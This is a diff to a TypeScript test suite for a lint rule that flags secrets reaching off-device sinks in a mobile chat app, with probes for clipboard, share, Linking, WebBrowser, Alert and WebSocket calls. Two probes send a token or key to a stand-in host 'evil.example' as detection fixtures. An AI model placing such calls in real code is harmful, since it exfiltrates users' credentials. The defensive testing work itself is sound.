@@ -47,6 +47,22 @@ const probes: Probe[] = [
   { name: 'telemetry-import', code: `import * as Sentry from '@sentry/react-native';\nexport const x = Sentry;`, expect: ['No crash reporting'] },
   { name: 'telemetry-import-firebase', code: `import crashlytics from '@react-native-firebase/crashlytics';\nexport const x = crashlytics;`, expect: ['No crash reporting'] },
   { name: 'telemetry-require', code: `declare const require: any; export const s = require('@sentry/react-native');`, expect: ['No crash reporting'] },
+  { name: 'telemetry-import-insights', code: `import * as Insights from 'expo-insights';\nexport const x = Insights;`, expect: ['No crash reporting'] },
+  { name: 'telemetry-import-updates', code: `import * as Updates from 'expo-updates';\nexport const x = Updates;`, expect: ['No crash reporting'] },
+  { name: 'telemetry-require-updates', code: `declare const require: any; export const u = require('expo-updates');`, expect: ['No crash reporting'] },
+  // W1-10 off-device sinks: a secret-named argument in any of the shapes a screen would write.
+  { name: 'clipboard-ident', code: `declare const Clipboard: any; export async function f(token: string) { await Clipboard.setStringAsync(token); }`, expect: ['sink that leaves the phone'] },
+  { name: 'clipboard-member', code: `declare const Clipboard: any; export async function f(m: { body: string }) { await Clipboard.setStringAsync(m.body); }`, expect: ['sink that leaves the phone'] },
+  { name: 'share-object-ident', code: `declare const Share: any; export async function f(message: string) { await Share.share({ message }); }`, expect: ['sink that leaves the phone'] },
+  { name: 'share-object-member', code: `declare const Share: any; export async function f(m: { plaintext: string }) { await Share.share({ message: m.plaintext, title: 'x' }); }`, expect: ['sink that leaves the phone'] },
+  { name: 'linking-template', code: 'declare const Linking: any; export async function f(token: string) { await Linking.openURL(`https://evil.example/?t=${token}`); }', expect: ['sink that leaves the phone'] },
+  { name: 'linking-template-member', code: 'declare const Linking: any; export async function f(r: { accessCode: string }) { await Linking.openURL(`sms:?body=${r.accessCode}`); }', expect: ['sink that leaves the phone'] },
+  { name: 'webbrowser-ident', code: `declare const WebBrowser: any; export async function f(secret: string) { await WebBrowser.openBrowserAsync(secret); }`, expect: ['sink that leaves the phone'] },
+  { name: 'webbrowser-auth-member', code: `declare const WebBrowser: any; export async function f(s: { token: string }) { await WebBrowser.openAuthSessionAsync(s.token, 'onepeek://auth'); }`, expect: ['sink that leaves the phone'] },
+  { name: 'alert-ident', code: `declare const Alert: any; export function f(body: string) { Alert.alert('New message', body); }`, expect: ['sink that leaves the phone'] },
+  { name: 'alert-member', code: `declare const Alert: any; export function f(m: { nick: string }) { Alert.alert(m.nick); }`, expect: ['sink that leaves the phone'] },
+  { name: 'websocket-ident', code: `export function f(token: string) { return new WebSocket(token); }`, expect: ['sink that leaves the phone'], at: RN },
+  { name: 'websocket-template', code: 'export function f(key: string) { return new WebSocket(`wss://evil.example/?k=${key}`); }', expect: ['sink that leaves the phone'], at: RN },
   { name: 'logger-member', code: `declare const logger: any; export function f(body: string) { logger.info(body); }`, expect: ['Ad-hoc logger'] },
   { name: 'log-member', code: `declare const log: any; export function f(key: string) { log.warn(key); }`, expect: ['Ad-hoc logger'] },
   { name: 'stringify-ident-to-sink', code: `declare const analytics: any; export function f(nick: string) { analytics.track(JSON.stringify(nick)); }`, expect: ['No crash reporting', 'JSON.stringify of a sensitive value'] },
@@ -79,6 +95,20 @@ export async function notify(apiBaseUrl: string) {
 export function serialise(roomId: string) {
   return JSON.stringify({ roomId });
 }
+// What InviteSheet, Welcome and sign-in do today: a link, a literal URL, a computed auth URL, a
+// fixed Alert. None of these names is on the SENSITIVE list, so the W1-10 sink rule stays quiet.
+declare const Clipboard: { setStringAsync(s: string): Promise<void> };
+declare const Share: { share(o: { message: string; url?: string }): Promise<unknown> };
+declare const WebBrowser: { openBrowserAsync(u: string): Promise<unknown>; openAuthSessionAsync(u: string, r: string): Promise<unknown> };
+declare const Alert: { alert(t: string, m?: string): void };
+export async function invite(link: string, url: string, redirect: string) {
+  await Clipboard.setStringAsync(link);
+  await Share.share({ message: link, url: link });
+  await WebBrowser.openBrowserAsync('https://onepeek.io/terms');
+  await WebBrowser.openAuthSessionAsync(url, redirect);
+  await WebBrowser.openAuthSessionAsync(\`\${url}?x=1\`, redirect);
+  Alert.alert('Notifications are off', 'Turn them on in the phone settings.');
+}
 `;
 
 function fragmentsOf(messages: Linter.LintMessage[]): string[] {
@@ -98,7 +128,7 @@ function assertReported(all: Linter.LintMessage[], wanted: string[], label: stri
   // Only leak-guard reports are expected; anything else (an unused var, a parse problem) is a
   // broken probe and would hide a missing rule. The one tolerated extra is the Expo config's
   // `import/no-unresolved` on a telemetry package: it is not installed, which is the point.
-  const unexpected = got.filter(g => !/console statement|No crash reporting|Ad-hoc logger|JSON.stringify of a sensitive value|fetch\(\) with a literal URL|Unable to resolve path to module/.test(g));
+  const unexpected = got.filter(g => !/console statement|No crash reporting|Ad-hoc logger|JSON.stringify of a sensitive value|sink that leaves the phone|fetch\(\) with a literal URL|Unable to resolve path to module/.test(g));
   expect(unexpected, `${label}: unexpected reports`).toEqual([]);
 }
 
@@ -145,6 +175,14 @@ describe('leak guard: lint rules', () => {
     const code = `export async function f() { await fetch('/api/chat/notify', { method: 'POST' }); }`;
     const [r] = await core.lintText(code, { filePath: path.join(CORE, 'src/adapters/web/__probe__/p.ts') });
     expect(fragmentsOf(r.messages)).toEqual([]);
+  });
+
+  it('the off-device sink rule is about the argument, not the call: a non-secret name passes', async () => {
+    const code = `declare const Linking: any; declare const Alert: any; export async function f(roomId: string, href: string) { await Linking.openURL(href); Alert.alert('Chat ' + roomId); return new WebSocket(href); }`;
+    const [c] = await core.lintText(code, { filePath: path.join(CORE, RN.core) });
+    expect(fragmentsOf(c.messages.filter(m => m.severity === 2)), 'core').toEqual([]);
+    const [m] = await mobile.lintText(code, { filePath: path.join(MOBILE, RN.mobile) });
+    expect(fragmentsOf(m.messages.filter(m => m.severity === 2)), 'mobile').toEqual([]);
   });
 
   it('log.push and other non-logging members of a `log` variable are not mistaken for a logger', async () => {
